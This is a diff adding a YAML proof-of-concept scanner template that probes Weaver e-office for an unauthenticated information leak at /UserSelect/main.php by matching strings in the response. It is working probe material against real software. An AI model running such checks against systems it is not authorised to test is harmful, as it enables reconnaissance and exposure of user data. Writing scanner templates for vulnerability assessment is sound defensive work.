@@ -1,0 +1,19 @@
+name: poc-yaml-eweaver-eoffice-mainselect-info-leak
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /UserSelect/main.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes("onclick=\"ClickUser")) && response.body.bcontains(bytes("/UserSelect/bottom.php")) && response.body.bcontains(bytes("function ClickUser"))
+expression: r0()
+detail:
+    author: NoHack(https://hack8.org)
+    links:
+        - https://www.seebug.org/vuldb/ssvid-92311
+    vulnerability:
+        id: CT-517449
+        level: medium
